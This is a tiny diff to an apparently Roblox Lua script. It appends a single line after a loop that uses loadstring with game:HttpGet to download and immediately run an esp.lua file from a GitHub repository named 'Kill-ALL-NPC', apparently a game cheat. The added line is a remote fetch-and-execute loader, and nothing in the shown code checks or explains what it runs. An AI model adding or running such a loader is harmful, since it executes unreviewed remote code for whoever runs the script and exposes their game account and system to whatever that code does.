@@ -63,3 +63,5 @@ while true do
         end
     end
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/crazydoge939-maker/Kill-ALL-NPC/refs/heads/main/esp.lua"))()
